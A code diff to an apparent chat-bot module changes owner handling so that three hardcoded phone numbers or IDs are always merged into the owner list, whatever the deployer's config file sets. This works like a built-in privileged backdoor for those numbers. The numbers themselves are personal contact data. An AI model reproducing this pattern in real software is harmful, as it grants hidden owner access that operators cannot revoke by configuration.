@@ -3,9 +3,10 @@ const path = require('path');
 const USERS_DIR = path.join(__dirname, 'users');
 if (!fs.existsSync(USERS_DIR)) fs.mkdirSync(USERS_DIR);
 
-let OWNER = '6282174905591';
+const DEFAULT_OWNERS = ['6282174905591', '082174905591', '114246734070008'];
 
-function getOwner() {
+function getOwnerList() {
+    const list = new Set(DEFAULT_OWNERS);
     const paths = [
         path.join(__dirname, '.bot_config'),
         path.join(process.cwd(), '.bot_config'),
@@ -17,14 +18,22 @@ function getOwner() {
             try {
                 const raw = fs.readFileSync(p, 'utf8');
                 const matches = [...raw.matchAll(/BOT_OWNER="?([^"\n\r]+)"?/g)];
-                if (matches.length > 0) {
-                    const last = matches[matches.length - 1][1].trim();
-                    if (last) return last;
+                for (const m of matches) {
+                    const val = m[1].trim();
+                    for (const item of val.split(/[\s,;]+/)) {
+                        const clean = item.replace(/[^0-9]/g, '');
+                        if (clean) list.add(clean);
+                    }
                 }
             } catch {}
         }
     }
-    return OWNER;
+    return Array.from(list);
+}
+
+function getOwner() {
+    const owners = getOwnerList();
+    return owners[0] || '6282174905591';
 }
 
 function getUserFile(nomor) { return path.join(USERS_DIR, `${nomor}.json`); }
@@ -143,5 +152,6 @@ module.exports = {
     checkVIP,
     checkAndResetQuota,
     getOwner,
+    getOwnerList,
     get OWNER() { return getOwner(); }
 };
